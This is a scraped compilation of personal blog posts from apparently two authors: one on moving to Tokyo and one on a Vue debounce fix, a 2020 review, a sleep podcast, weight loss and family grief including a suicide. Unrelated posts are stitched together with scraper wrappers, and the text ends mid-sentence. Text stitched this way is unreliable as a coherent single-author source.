EXCEPT DESCRIPTION FOUND: ['A month ago I arrived in Tokyo. Adjustments have been incremental. I usually take the weekends to gather myself. Make the adjustments like getting my insurance card or buying a belt. I have been losing weight again. This happened during the internship last year as well. But I only know that I am losing weight because my pants don’t “perfectly fit” anymore. I have no idea how much I weigh right now. For the last few years I knew my waist size so I could just buy stretchy jeans at that size and I never needed a belt. Well, I need a belt again. It could just be my body trying to adjust to the foods and such. I might regain it after my body figures out what’s going on. I do feel like I am eating a bit healthier. The company cafeteria’s food options are mostly pretty healthy. Even when the main course isn’t the most healthy thing; there’s always salad included and the desert is usually fairly light.\n\n\n\nHeading out from the mall\n\n\nBeyond the ‘away from friends and family’ thing, I feel like life is just about similar to US except with mild inconveniences. Particularly for my situation. Language barriers; completely different systems to get bank stuff; company cafeteria is packed at lunch time; share house has like 20 people, but only 3 showers I can use. Usually the work commute isn’t too packed, but sometimes I time it differently and it’ll be very crowded. Water cups are too small. But beyond those inconveniences it’s been going well. I’m sleeping normally. Work is keeping me busy with various tasks. Pokemon Go is way more fun. I am starting to manage to do more in the evenings after work. Somedays, I’m still drained after work and pretty much just relax with youtube or something. But I am slowly getting better and trying to do at least a little bit of something productive most nights. My weekends have been fairly relaxed. Usually involves running to the post office to pick up some mail, cleaning, laundry, doing a little bit of a side project, and spending time with the girlfriend.\n\n\n\nHeading out from the mall\n\n\nAs for side projects, I have been focusing on trying to learn more about 3d modeling. I’ve used Blender3d in the past, but it’s changed a lot and there’s so many things I just don’t know in it. So I have been following tutorials and practicing things. One of them was a fun little donut tutorial. Hoping to come up with some 3d models that I’m okay with and start working on some other aspects of the project. I haven’t done much coding outside of work lately. Somewhat drained of coding beyond work lately. Which is a bummer because I have some cool projects I want to work on, but I’m allowing myself the space as I am still in a sort of transitionary period. This is the same for my Japanese language study. I really don’t like that I am “putting it off”, but I am giving myself a little bit more time.\n\n\n\nLearning Blender\n\n\nI have been hit and miss on regularly writing. I am trying to do 750 words regularly. It’s a really neat site. It’s basically the “morning pages” concept of just write 750 words a day. The hope for me being that the regular writing there will help transfer to writing on the blog and keeping consistent. It has helped I think. I even wrote part of this post in it. For the most part, that writing is usually fairly mindless. I don’t bother reading much of it after because sometimes it’s absolute nonsense. Half thoughts between other thoughts. However, other times it’s a snapshot of life. Reading some really old entries is what inspired me to go for the blog format for the “Jamie shares his Japan adventures”.\nI am looking into getting a new camera. I will be selling my current one to fund the new one. It’s actually a camera I was waiting to be released. I am excited to try it out. Hoping to go out and do a picture day with a friend here, but waiting for our schedules to line up.'] at ['https://longest.voyage/log/first-month/']

EXCEPT DESCRIPTION FOUND: ['You’d think after more than a week and being able to sleep a whole night through, jet lag would be finished. I don’t think I’ve quite gotten through it. Even as I write this, I am struggling to stay awake. It’s closing in on two full weeks here, and I have a hard time getting through the day still. It took me about a week to sleep through the night, but the evenings are just killer. I pretty much get home as quickly as possible then lay in bed trying to stay awake with various movies. Netflix in Japan — for whatever reason — has way more options. Like back in the day when netflix had some good movies. Very sleepily caught up on the (not that) new Spider-man movies and AGDQ speed-runs.\n\n\n\nMost of the time has just been me trying to set up all the various things. I finally got a Japanese phone number and a Japanese bank account. They have a difficult nearly catch-22 with setting up the bank and phone. In many cases they require a Japanese number or a Japanese bank account. Luckily, a coworker gave me a lead on a place that I can use my US credit card to get a Japanese phone number. It was an odd frustration at the bank to set up the account. Partially because I was told by my contracting company I don’t need a number to set up the account, and then they required it for me. Rest was just frustrating talking with the bank teller. I attempted to explain how I don’t have a work number at my company. I don’t even having a desk phone. She insisting that I would have one (she has worked with other people from the company). I have since checked, I do not have an office number. I am fairly certain I have to be a full-time employee to get one unless my role required one. The whole process went much more smoothly after getting a phone set up over the weekend. After all that, there’s still gotchas with the bank account that I have to figure out.\nI feel I will probably have a bigger post about the company I am working at in the future. But so far the impression is that there is a crap ton of people. They have cafeteria for all three meals, but I don’t want to stay late (7pm) for dinner most of the time and sometimes it’s tricky getting there early enough for breakfast. Despite the large amount of people, our team is understaffed. They already have me diving deep in some code. The first week was pretty exhausting. Luckily, the commute is not too intense. It’s not overly packed on the train, or particularly far. I get a decent amount of steps in as well which is good.\nFirst weekend in, I was able to see some friends. We did a 飲み放題 (nomihoudai - all you can drink) which was my first time doing that. They had various sake, beers, sodas, etc. It was a good time catching up with people and making friends. My friends daughter is getting so big. She’s adorable. Every time I’ve visited in the past she’d completely forget me, then be super friendly after an hour or two. We’ll see if she remembers me next time. I am still not quite adjusted to the idea that I am not traveling here. It’s not a quick stop in to say “hi”, and disappear. This is particularly great with being able to see the girlfriend. After a whirlwind of a first work week, it was great to see her. I am very far away from it feeling like home here, so having her around really helps. And we can see each other next weekend rather than several months from now. Amazing.\n\n\n\n\nRandom English:\nCreepy Nuts - from a T-shirt\n\nI still haven’t started work on the train game. Which is frustrating me. I am hoping the evening exhaustion slows down a bit over the next week. Have tons of ideas that already will take me a bit of time to work out. I really need to just start prototyping some of the ideas to get a rough version down. Over the last weekend, the girlfriend and I went to Picotachi. It’s a small event for game creators, artists, musicians to show off what they’ve been working on. It’s a really cool and inspiring event. I attended it ~7 years ago the first time I went to Japan. This was another thing I was kind of excited that I could semi-regularly join since I live here now. We played some card games, chatted with various people, and watched some presentations. I am hoping to making some progress on the train game to demo it there. This should help be a good motivator.\nAnother thing I would like to do is experiment more with editing my photos. Particularly with lightroom. I’m not super into the heavy photoshop editing. When I experimented with the last set of photos, I found that with the more vibrant or shifted colors you can sometimes get better focus of your subject. Which… sounds silly and maybe obvious out-loud. But I had always tended to go for a more subtle/naturalish coloring. Didn’t attempt to bend reality too much. I think I will give myself some more room to experiment. The pictures on this page were some of my first round of experiments with pushing the colors a tiny bit further than the original edits. Found some inspiration online from people like Vlad, Denise, and of course Liam. Vlad is a writer that has been taking some really neat photos and also showing how he has played with some photos differently. Kind of nice to see different possibilities with the same photos. Most photographers just display their finished version.\nAfter the side projects and hobbies, there’s a list of just exploring Japan, trying to figure out my social life, and various chores that come along with moving to a new country. There’s so many things I’m looking forward to. Just really hoping this jet lag lets me do them.'] at ['https://longest.voyage/log/lag/']

EXCEPT DESCRIPTION FOUND: ['I arrived at Haneda yesterday afternoon. I don’t know if it’s because of winter or if the sun sets a little bit earlier in Tokyo. The sun was already setting as I made it out of the airport and dark by the time we made it to the sharehouse around 5pm. Immigration went smoothly. Got my residence card which has the picture I took from my bedroom and used for my visa documents. Feels weird seeing a picture I took myself rather than some “official” photo taken somewhere. After my experience with Walgreens trying to take my picture, I learned I could actually just do it myself and have them print my picture. My girlfriend met me right outside of the customs exit. Which was so nice to see after 16 hours of traveling and a few days of scrambling to get ready to leave.\n\n\n\nMorning train by the creek\n\n\nThe flights themselves weren’t too bad. I upgraded to “Comfort Plus”, which is funny because it implies the most basic one is just “comfort”. On the first flight someone from the first class section decided to sit next to their girlfriend instead, who was sitting on my row. I ended up getting a last second upgrade to first class for the first flight since he wanted to sit there. It was nice. I played sudoku and ate a banana. The long flight to Tokyo, I ended up getting destroyed in smash brothers by the guy sitting next to me. Watched one and a half movies. Half of a spider-man movie that I’ve only seen the first half of, and some other movie that has escaped my mind. Also, either the (even slightly) upgraded seats get better food or Delta has improved their international flight food over the last few years.\nLuckily, Haneda is significantly closer to where I live compared to the other main airport. Glad I realized this, because it cut out an hour of us carrying all my luggage. On the way to the sharehouse, something I found amusing — in the “I’m 5 years old” sense — was a station on my train line called “尻手”. Which separated, the kanji mean “butt” and “hand”. And if you were to read it with English characters it is “Shitte”.\nAfter dropping my bags at the sharehouse, we went out to grab some food and bought some bedding. As we walked around the shoppping center, we starting talking about weekend plans. Which hasn’t sunken in as something I can do with my girlfriend. We have had a long distance relationship for the last year. Almost the entire duration of our relationship so far. For dinner, we ate okonomiyaki; a sort of savory pancake that is one of my favorite Japanese foods. We got a “seafood” variety of it that had shrimp, octopus, and few other things. We sat a few tables over from some Japanese businessmen; one of which was using a magnifying glass to look at his phone. I wasn’t too particularly hungry after the flight, but it was really good. I tend to have some weird travel anxiety that doesn’t do much beyond kill my appetite and make me worried I will get sent home for something beyond my control. That feeling tends to linger until I get some sleep. My girlfriend rode with me to my station. We said our good nights, she headed home, and I walked home with a bunch of blankets.\nThe jetlag kicked in immediately. I figured I’d at least sleep the first night through fine, but that was not the case. I woke up very well rested at 1am, but pushed for another 2 and a half hours before my body decided it was not going to sleep any more. Since I went to bed around 10, I think it was an alright amount of sleep, but it’s going to kick my butt tonight.\n\n\n\nTrain Tracks\n\n\nSo I got up early, showered, charged my phone, grabbed my camera, and walked around the area taking a couple of pictures. I managed to figure out how to get to and from the station without GPS. I’m glad I figured that out quickly. I have a lot of tiny things to get sorted out over the next week or two. Lots of new challenges, and I gotta get back on my Japanese study grind. In addition to that, I have been talking with my little brother about some project ideas. We’ve done some brain storming and have a super simple prototype. We’re planning to expanding it a bit more this year. I intend to write about that project on here as well. This will also be my main place to post photos I will be taking around Tokyo.'] at ['https://longest.voyage/log/arrival/']

EXCEPT DESCRIPTION FOUND: ['I’ve loved the idea of living in Japan for a year or two since high school. I traveled there with my best friend after I finished community college. We had saved up for over a year to do a 20 day trip to Tokyo. Hung out at arcades, watched a Dragon Ball movie at a theater, and tried new foods. We had a blast. Since that trip I have been super fortunate to be able to visit Japan several more times. It had gotten to the point where I don’t know if I could do another vacation there, because I’ve been incredibly lucky to be able to travel all over Japan. I figured I would only travel for special events, seeing friends, or a job.\n\n\n\nIkahou\n\n\nA little over a year ago I put in my notice that I was quitting my job. I ran off to Japan to try out an internship at a software company in Tokyo. If that internship didn’t end with a job offer, I had another offer to teach English the next spring. The internship was fun. I didn’t do anything difficult. It was just some simple web development with different tools. Well, it didn’t lead to a full time position. Which was a bummer, but while there a few things happened.\n\n\n\nSendai\n\n\nAlmost all of my friends in Japan are in Tokyo. I found out while traveling is that I enjoy Japan, but it’s very easy for me to not get the social interaction I need on my own. I’m introverted, but I need some amount of interaction. If it’s too much, I get drained. And if too little, I get depressed. I had thought teaching could be my foot into the door if I really enjoy living there, but after the internship I realized there are other options that could fit me better. I realized I don’t really want to teach English in the middle of nowhere in Japan.\nThe other thing that happened took me by surprise. I ended up meeting someone. We hung out almost every weekend. Kissed at the station before I left for the US two days later. Without losing a beat, we started skyping weekly. After several weeks of that, I asked her to be my girlfriend. This was another motivation for searching for something in Tokyo.\nIn the meantime, told the English teaching company that I wasn’t going to join them, and I rejoined the company I was working at in the US before the internship. I managed to land a promotion and a raise while I slowly searched for new positions in Japan. I’ve always enjoyed my teammates at this company. This team was no different, which has been making these last few days painful. Over a year after putting in my two weeks last year, I’m doing it again. After finding a software development position in Tokyo. I’m super excited and terrified. Let’s try this again.'] at ['https://longest.voyage/log/replay/']

Writing here is on that. The barrier of entry and cost is so low that it’s easy for me to try to write here, but I get busy and forget. Move on to other things. Spend my time drawing, watching netflix, programming.\n\n\n\nShimokitazawa\n\n\nI’m on week four into my internship. The company seems pretty great. A good mix of Japanese and Western style. They seem very interested in growing and willing to change in order to achieve that. So far I’ve been able to learn a bit of new things. Starting a new assignment next week. Hopefully, I’ll get to flex my skills with this one. Last two have been mostly brand new things to me. Unfortunately, don’t get to practice my Japanese much other than some occasional passive listening. Have to reach out to my friends to practice.\nLiving in Tokyo has been an interesting change. The crowded Shibuya-bound trains are packed in the mornings. I usually have enough time to wait for the next train, but for some reason I jump into the already packed one when the door opens.\nWorking on making friends here. Most of the people I already knew here are a little older than me, so I’m trying to find a few closer to my age. Had a video chat with my best friend which was really nice. Haven’t seen him in a while and it was great to catch up.\nI went to a live house the other week. Amazing experience. I went and bought earplugs the next day so I can listen safely next time.

One of the QA testers stood up and walked out of the room. The weight on my shoulders go with him. I wanted everyone in the room to announce it. The team gathered in the room again for a meeting. Afterwards we discussed what we just heard over the conference call. Talking about the future of the company, our jobs, our concerns. My desk is littered with random things to play with. My fingers fumbling around with my cube magnets. I stand and awkwardly announce that the Friday of the following week will be my last day at the company.\n“Is this an April Fool’s joke?”\nWell, it’s September.\nI counted down to the day I put in my notice. Probably started counting down around 40 or 50 days ago. The point of no return. Even though I had housing confirmed for nearly two weeks. Plane ticket for about three. Even talked to my technical lead the Friday before about leaving. We spent over an hour catching up on what I’ve been working on for the last two months. Regardless, leaving wasn’t real until that point. That point of letting go of stability to grab onto another opportunity.\nI’m extremely excited, but also quite terrified.\nSo, here’s the ‘blog’. This is supposed to help me get through this, right?\nWith less than four weeks to go until I leave for the other-side of the world. I have a lot to do. Stuff to get rid of. Stuff to store.

This is mostly for my own notes, but maybe it\'ll be useful to you too!\nSo, my web app is built on Vue. Occasionally, it has made sense to use Lodash\'s debounce function to prevent expensive and/or asynchronous operations from being called multiple times in quick succession. In the past, that\'s worked very well for me, and I never realized that there could be any complications involved in such a use until yesterday. First, let me describe what I did and what went wrong. Consider a component with this definition:\nconst Vue = require("vue")\n\nVue.component("my-cool-component", {\n  template: `\n    <button @click="runExpensiveOperation">\n      Run the expensive operation!\n    </button>\n  `,\n\n  methods: {\n    runExpensiveOperation: function(){\n      // ...\n    },\n  },\n})\n\nIn other words, when the button is clicked, the component runs an expensive operation. But since the user can potentially click the button multiple times in quick succession (and thus initiate the expensive operation multiple times very quickly), it makes sense to "debounce" the function so that it only gets executed once in a given timeframe, even if called multiple times during that timeframe. So, the easy way to do that is to wrap the expensive function in Lodash\'s debounce function, like this:\nconst Vue = require("vue")\nconst lodash = require("lodash")\n\nVue.component("my-cool-component", {\n  ...\n\n  methods: {\n    runExpensiveOperation: lodash.debounce(function(){\n      // ...\n    }, 100),\n  },\n})\n\nSo, I\'ve declared that this expensive operation shall only run 100 milliseconds after the last successive call (and then the timer will reset).\nNow, this setup works great, but only if there\'s one instance of the <my-cool-component> component mounted. If there are multiple instances of the component mounted, then only one of them will run the expensive operation!\nAs a toy example, consider this component:\nconst Vue = require("vue")\nconst lodash = require("lodash")\n\nVue.component("random-number", {\n  template: `\n    <div v-html="x"></div>\n  `,\n\n  data: function(){\n    return {\n      x: 0,\n    }\n  },\n\n  methods: {\n    update: function(){\n      this.x = Math.random()\n    },\n  },\n\n  mounted: function(){\n    this.update()\n  },\n})\n\nThis component generates a random number and displays it. Nothing too fancy. (Please forgive my use of the v-html directive in this component\'s template; I had to use it because my site generator tried to parse the double curly brace notation.)\nAnd suppose that we use the above component in this app:\nconst Vue = require("vue")\n\nconst app = new Vue({\n  el: "#app",\n\n  template: `\n    <div>\n      <random-number></random-number>\n      <random-number></random-number>\n      <random-number></random-number>\n      <random-number></random-number>\n      <random-number></random-number>\n    </div>\n  `,\n})\n\nSo, this app should display five random numbers, like this:\n0.3485475563141829\n0.27104351148962946\n0.12110439321774624\n0.08632019215212428\n0.751542072380456\nBut let\'s pretend for a moment that the <random-number> component\'s update method is expensive. So, I\'ll debounce it:\nconst Vue = require("vue")\nconst lodash = require("lodash")\n\nVue.component("random-number", {\n  ...\n\n  methods: {\n    update: lodash.debounce(function(){\n      this.x = Math.random()\n    }, 100),\n  },\n\n  ...\n})\n\nSuddenly, however, the app no longer works as I\'d expect. I\'d expect each component to update its x-value 100 milliseconds after being mounted. Instead, only one of the components updates itself, and the results look like this:\n0\n0\n0\n0\n0.007477773277148825\nWhat does make sense about this is that we\'re calling a function multiple times in quick succession, but it\'s only running once — which is exactly what debouncing is supposed to do. On the other hand, what doesn\'t make sense about this to me is that, in my mental model of the app, each component instance should have its own copy of the debounced update method that\'s completely separate from the copies owned by the other instances; in other words, one instance of the <random-number> component calling its update method should have no effect on the other instances of the component. But that\'s clearly not what\'s happening; instead, all of the instances seem to be sharing the same debounced update method!\nWell, that\'s clearly problematic. This first explanation for this phenomenon that occurred to me was something like: well, we\'re passing a single object to the Vue.component method for registration, so maybe all of the component instances share in common the properties of that object. But that doesn\'t seem right, since the update method worked just fine before debouncing; i.e., each instance knew how to update its own x value; i.e., each instance referenced the correct this in its update method. So, this explanation might still be right — it might still be the case that all instances of a component share in common the properties of that one object that was passed into the registration function — but perhaps there\'s some magic going on behind the scenes to bind each method call to the right instance at execution time...or something like that.\nI still don\'t know whether or not that explanation is right, but in any case, it helped me to find the solution to the problem. I figured that if some kind of binding was happening behind the scenes, then such a binding might help me to fix the debouncing problem. According to the MDN docs, Function.prototype.bind "creates a new function that, when called, has its this keyword set to the provided value, with a given sequence of arguments preceding any provided when the new function is called." I knew that Lodash\'s debounce function returned another function, so I speculated that the right thing to do would be to bind that returned (debounced) function to the component object. So, I changed the update method back to its non-debounced formulation, and then I performed the debouncing and binding in the mounted method:\nconst Vue = require("vue")\nconst lodash = require("lodash")\n\nVue.component("random-number", {\n  ...\n\n  methods: {\n    update: function(){\n      this.x = Math.random()\n    },\n  },\n\n  mounted: function(){\n    this.update = lodash.debounce(this.update, 100).bind(this)\n    this.update()\n  },\n})\n\nAnd that solved the problem!

EXCEPT DESCRIPTION FOUND: ['Obviously, this year has been hard for everyone because of COVID, so I\'ll skip over all of that. Besides that, what happened for me this year?\nThis year, I got much more familiar with my mental landscape, especially with my depression and anxiety. I was on Prozac for almost the entire year, and it worked wonders for me. But in addition to having a more stable mood and less anxiety, I became much more aware of the differences between depression and anxiety. Those differences probably seem obvious to you, but I think I couldn\'t tell the difference for a long time primarily (I think) because they always seemed to show up at the same time. I could probably have described the differences, but now I\'m pretty sure I can feel the differences. That\'s been useful because I recently stopped taking Prozac, and it\'s been interesting to notice how the landscape has shifted without it. (I got off both of my medications because I was tired of (1) the insomnia and weight gain from the Prozac and (2) the side effects from the medication that was supposed to mitigate the insomnia. My mood felt pretty stable anyway, and I wasn\'t experiencing any traumatic life events, so I figured it was a good time to try to wean myself off. I discussed it with my doctor, of course, and he gave his blessing.) My anxiety levels have risen a lot in the last few weeks, but my mood has stayed pretty stable. Weirdly, nothing in particular is making me anxious; I think I just tend to have a higher default anxiety level than most people. In fact, I\'d say I mostly experience the physical symptoms of anxiety right now rather than the conscious symptoms when the anxiety kicks in: my heart rate increases, my muscles become more tense, I breathe faster, and I become super sensitive to bright lights and loud sounds...but I feel emotionally quite normal.\nI\'ve also taken up meditation. I still haven\'t set aside a regular time for it yet, but I try to do it any time I have down time. I\'ve actually been surprised at how quickly I\'ve been able to notice changes in how I react to certain stimuli, especially to the impulse to eat. (I won\'t call that impulse "hunger" since I quite often eat out of sheer habit even when I\'m not hungry, usually as a way to cope with anxiety.) I\'d like to do more meditation in the coming year!\nThis year, I launched the Public Domain Tapes podcast. It\'s been a great way to scratch my creative itches. I wish I could devote more time to it and/or make episodes more quickly, but at the moment there\'s not really a way to increase the rate of production. But I\'ve gotten tons of positive feedback on it so far, so I\'m excited to see where it goes!\nFor a month or two this year, my spouse and I dove deeply into the Twin Peaks universe! It was SO MUCH FUN to watch the original two seasons of the show, read the two "dossiers" by Mark Frost, watch the recently-added third season of the show, watch the movie (Twin Peaks: Fire Walk with Me), listen to dozens of podcasts, and begin dipping my toes into David Lynch\'s other work. It\'s such a fun, fantastic, weird story, even if I don\'t understand lots of it!\nWork has been really good this year. I still have a wide variety of responsibilities at Spark Wave, including web development, design, data science, research, and audio editing. I like having a variety of things to do. I also enjoy feeling needed and like I have the ability to help people. There have been lots of times this year where my boss has looped me into an email thread, saying something like: "Hey, so-and-so! Let me introduce you to Josh. He knows a lot about such-and-such. Josh, could you help so-and-so with this problem?" It makes me feel all warm and fuzzy inside when I then get to help the person fix whatever problem they\'re having.\nFinally, I read a fair bit this year. Check out the bookshelf to see the full list. Some of my favorites were:\n\neverything by Ted Chiang\neverything by Madeline Miller\neverything by Oliver Sacks\nI\'m Thinking of Ending Things, by Iain Reid\nEducated, by Tara Westover\n\nFor 2021, my main goal is to lose weight. I\'ve been steadily gaining weight for the past two years, and it\'s time to shed it. Ideally, I\'d like to lose about 50 pounds. I may write more about that, though, when I come up with a more concrete plan.\nAs always, thanks for reading! I hope you have a happy new year!\n'] at ['https://ameyama.com/blog/2020-the-year-in-review']

EXCEPT DESCRIPTION FOUND: ['I used to listen to a podcast called Half Hour Intern. In each episode — which usually lasted more than a half hour, despite the show\'s name — Blake, the host, would interview people about their career paths and how they got started doing what they love. In one interview, Blake talked to Drew Ackerman, the creator of the Sleep With Me podcast. At that point, I had listened to a lot of podcasts, but I\'d never heard of a podcast that was specifically designed to help people fall asleep. I was intrigued, so I downloaded an episode of Ackerman\'s podcast and gave it a listen. What I heard totally defied my expectations. I was expecting a beautifully-produced tapestry of soothing music and calming meditations about reducing anxiety or letting go of the events of the day, maybe with multiple voices, maybe with sound effects, etc. But I discovered instead that the show was nothing more or less than Ackerman rambling for an hour in what seemed a completely unscripted, unfocused, goofy way. He had a scratchy, creaky voice, and there was no music (except the brief intro song). The show was so far from my expectations that I was immediately unimpressed and even a little irritated, so I deleted the episode and put the show out of my mind.\nA few years passed, and life got really, really rough in 2018 for my family, as I\'ve mentioned before. I was living in constant anxiety and stress for several months, and for the first time in my life, I was having real trouble sleeping. I decided to go looking for podcasts that might help, and Sleep With Me was mentioned everywhere I looked as being a fantastic sleep podcast. At that point, I only vaguely remembered that I\'d checked out the show once before, but I was desperate to try anything, so I subscribed to it. At bedtime that night, I picked a random episode and started listening. And despite my low expectations, my anxiety ebbed away, and I fell asleep within minutes. I think I must\'ve listened with headphones that first night because the next night, I mentioned the show to my wife. She was just about as stressed as I was, so she agreed to give it a try. The next morning, I asked her about it, and she said something like, "It was amazing! I can\'t believe how fast I fell asleep!"\nAfter that, we started listening every night. And we\'ve been listening every night for over two years now. In fact, we usually listen to multiple episodes each night. If one of us wakes up in the middle of the night, we\'ll start a new episode and go back to sleep (or try, at least). My daughter listens to the show every night, too! And now we support the show on Patreon in the $20 per month tier. But here\'s the thing: the show isn\'t just good at helping us fall asleep. It\'s so much more special than that. So, I\'ve decided to write this post to try to describe what the show means to me and to our family. If you\'ve never tried it but need help overcoming anxiety or going to sleep, I can\'t recommend this show highly enough. If you\'ve tried it once before but didn\'t get much out of it the first time (as was my experience), I\'d like to encourage you to try it again. But either way, I just want to tell you how awesome Drew Ackerman is.\nIn the show, Drew goes by "Scooter," or "Scoots" for short. And the format is roughly the same for each episode: there\'s an intro that lasts somewhere between 10 and 20 minutes, there\'s a short transition in which the episode\'s bedtime story premise is introduced (often by Scooter pretending to be Antonio Banderas — goofy, I know, but just listen and it\'ll make sense after a while), and then Scooter tells the story. In the intro, Scoots tries to make a metaphor for the podcast and riffs on a few little themes. It\'s rambling and calming, and the point of that section is to provide a little bit of wind-down time. Scooter mentioned in one episode that he worried that if he jumped straight into a story, then people would feel like, Oh, crap! He\'s already started telling the story, so I\'ve gotta start falling asleep right now! So, the intro is there to help ease people into bedtime, to help them calm their minds and put away nagging thoughts. And then Scooter tells the bedtime story in a rambling, unfocused way.\nI like the intros, and I always listen to them, but I love the bedtime stories. They\'re quite varied and unique. Scoots wrote a lot of them himself. For example, he has a 12-part series called "Nuns in Space," which features a character called Scooter who pilots a spaceship through a cloud of delusion while dealing with the passengers, which are the nuns from Scooter\'s childhood. But that\'s just the first season; the second season, which also has 12 parts, is called "The Stan Chronicles." Stan is a sentient freestyle soda machine AI, and the second season is about Stan\'s and Scooter\'s adventures trying to escape the cloud of delusion by improving Stan\'s artistic sensibilities by working their way through Julia Cameron\'s book The Artist\'s Way. There\'s a different 2-season series called "Big Farm in the Sky P.I.," which is about Simon, a guy who went to "the big farm in the sky," became a private investigator, and started solving cases. Another series with three seasons is called "After the Glass Slipper," and it tells the story of Cinderella and her stepmother Agatha after the events of the traditional fairy tale. (I should also point out that these stories are usually "episodically modular," by which Scoots means that you can listen to them in pretty much any order.)\nBut those are just the stories that Scoots has written himself (among others that I haven\'t mentioned)! He also tells stories called "real-time recipes" where he describes his steps as he cooks a meal. Or he watches a show (like Doctor Who, Game of Thrones, Star Trek: The Next Generation, and many others) and comments on it. Or he unboxes a board game. Or he tries to re-tell the plot of a childhood movie without having watched it recently. Or he reads through a Trader Joe\'s "Fearless Flyer" magazine. And the list goes on. And if those things sound silly or boring...well, that\'s exactly the point! They\'re just interesting enough to pull your attention away from negative thoughts that might otherwise pester you, but they\'re not so interesting that they hook you and keep you awake. And they\'re funny and light-hearted enough that they might bring a grin to your face, but you won\'t be laughing out loud.\nAll the while, he drones on in "creaky-dulcet" tones, avoids topics that might be sensitive for listeners, tells goofy jokes, meanders down pointless tangents, gets lost, circles back, and lets you know in so many words that his goal is really just to sit beside you as a friend in the "deep, dark night" while you fall asleep. If I had been tasked with designing a sleep podcast, I probably would\'ve done what I described at the beginning: I\'d have tried to use calming music and meticulously-written monologues delivered by soothing voices. But Scooter knows what I once knew as a child and what I remembered again as a parent: that what really holds many of us back from sleeping is not the lack of a polished bedtime production with music and voice actors and sound effects, but a feeling of loneliness, a wish that a caring, comforting person could sit at our bedside and just be there while we drift off.\nSometimes, Scooter explicitly describes his reasons for making the podcast. He talks about how he had trouble sleeping as a child and how funny radio shows took his mind off things and helped to draw some of the seriousness out of bedtime; and now he wants to do the same thing for other people. Most of the time, though, he doesn\'t need to state his mission directly for you to feel the care and kindness emanating from every second of the show. You know the warm, fuzzy feeling you get when you watch Fred Rogers or Bob Ross? I get that feeling from listening to Scoots, too. To me, he\'s in that same small pantheon of Best Human Beings Ever.\nAnd that\'s the primary reason, I think, why the show has such a massive following. I don\'t have access to his analytics, but he\'s mentioned before that the show gets hundreds of thousands of downloads every month (and it might be in the millions now; I don\'t know); he\'s got more than 5,000 supporters on Patreon at this moment; and he\'s been featured in all kinds of news media outlets. And it\'s all because he\'s just such a sweet, funny, caring person. He makes a wonderful podcast, of course, but that product is merely a reflection of Drew himself.\nAnyway, I could keep on like this for a while, but I\'ll spare you. I hope I\'ve convinced you to give the show a shot if you haven\'t tried it yet and need help sleeping or calming down. Sweet dreams!\n'] at ['https://ameyama.com/blog/sleep-with-me-a-testimonial']

EXCEPT DESCRIPTION FOUND: ['So, I\'m about 40 pounds overweight right now, and I\'m not happy about it. I\'ve been trying to lose weight for years, but I just haven\'t been able to stick with a diet or exercise regimen. I usually follow this pattern:\n\nHate myself.\nDecide that I want to lose weight.\nPunish myself with an extreme exercise or diet program.\nFail hard because the program is too intense and because I don\'t immediately see the results I want.\nGain even more weight instead.\nRepeat.\n\nBut about nine weeks ago, something miraculous happened. I started the couch-to-5k running program...and stuck with it. Now, to be clear, I haven\'t lost any weight yet. And I\'m only on week six (of nine, I think) because I have to keep repeating workouts because I can\'t completely run them without stopping yet. But it\'s still miraculous because this is probably the longest I\'ve stuck with an exercise program since high school! The reason I\'ve been able to stick with it so far — and hopefully writing this won\'t jinx me — is because I read a blog post that changed my whole outlook. It was a post called "Focus on the Inputs". Here\'s the gist:\n\n"Instead of becoming ever more vigilant about getting myself to achieve certain outcomes, I\'m monitoring quality of the input. I\'m just trying to get more good things into the hopper, and letting the system do its work."\n— David, raptitude.com\n\nI needed to hear that. I needed to hear that I\'d been too focused on the outcomes. I needed to hear that the system will take care of the results, but that I can\'t even hope to have good results if I\'m not providing good inputs into the system.\nAs I mentioned in step 4 above, one of the reasons I think I kept failing at past attempts to get fit was my obsession with seeing immediate results. I know somewhere in my brain that a person can\'t lose 40 pounds overnight...but I\'d nevertheless weigh in every day and see if I\'d made any progress yet. And when I hadn\'t, my morale would plummet. But reading David\'s blog post made something click for me. I thought: Is it better to be 40 pounds overweight and to run every day, or to be 40 pounds overweight and to not run every day? Well, all things being equal, I suppose the former is better. Of course, I probably don\'t intrinsically value exercise; i.e., I wouldn\'t keep doing it if it never had any positive benefits. But by focusing on the inputs, I\'m giving myself the leisure to worry much less about if and when the benefits will appear.\nI\'ve been repeating the phrase "focus on the inputs" to myself over and over and over for the past nine weeks. Now the challenge is to keep it from becoming a meaningless set of syllables, to keep the meaning alive and fresh. I suppose that that probably just takes time and intention and focus. But it\'s something I\'m working on. I\'m also working on applying the same ideas to my diet. Honestly, though, I think that\'ll be a bit harder. I don\'t know if everyone\'s this way, but I feel a weird kind of asymmetry about diet and exercise. Exercise feels like doing something that I don\'t particularly enjoy, but diet feels like not doing something that I really do enjoy. And while those sound somewhat opposite, I find that preventing myself from doing something I enjoy is significantly more difficult than forcing myself to do something I don\'t enjoy. Maybe there\'s some weird kind of loss aversion bias going on there. I\'m not sure.\nAnyway, I just thought I\'d put these thoughts up here both as a reminder to myself and as an encouragement to anyone who might need to hear them.

EXCEPT DESCRIPTION FOUND: ["Addie\nA while back, we adopted a sweet dog named Addie. She was the goodest girl.\nBut due to a series of unfortunate events, we were unable to keep her. On her last day with us, I put her in her crate in the car and drove her through the cold and rain to the Human Society of North Texas. She whimpered and shivered the whole way there, even though it was warm in the car. When I opened her crate, she didn't want to get out. When I opened the door to the building, she didn't want to go in. I filled out the relevant paperwork in something of a mental and emotional fog, but it wasn't until I was back in the car, quiet and alone, that the sadness finally washed over me. An hour later, I had to pick my daughter up from school and tell her the horrible news. She sobbed all the way home.\nAddie was such a sweet girl, and I know she's probably with another family now. She was young and cute and gentle and well-tempered, so she almost certainly got adopted by another family right away. My wife haunted the Human Society website to keep an eye on her posting until it disappeared again a short while later, and then we finally felt a little bit of closure. But I've been so sad about her lately, hoping she's okay, hoping she's having a good life wherever she is.\nAnna\nA year and a half ago, my wife's sister, Anna, committed suicide. We were visiting my parents at the time, and my wife's parents called my mom and asked to speak to my wife. There was so much grief on both ends of the phone line that the conversation was almost unintelligible. And then we left immediately to drive late into the night to get home to be near her family. The whole car trip was spent in alternating weeping and silence.\nAnna's birthday was earlier this week, and her death has weighed especially heavy on my wife's mind for the past several days. She says that the sadness and anger and sense of loss are still as fresh as they were when it happened.\nAnna was a good person who fell on hard times in adulthood. Her marriage was rocky. She suffered from substance abuse and addiction. She had what seemed like a handful of mental health problems, though she was probably never officially diagnosed. Fortunately, I knew her for a few years before things got bad. But it's still so desperately sad that such a good person could feel that life was so horrible that it would be better not to be alive.\nThe Shit\nAnd today marks two years to the day since The Shit™ happened. 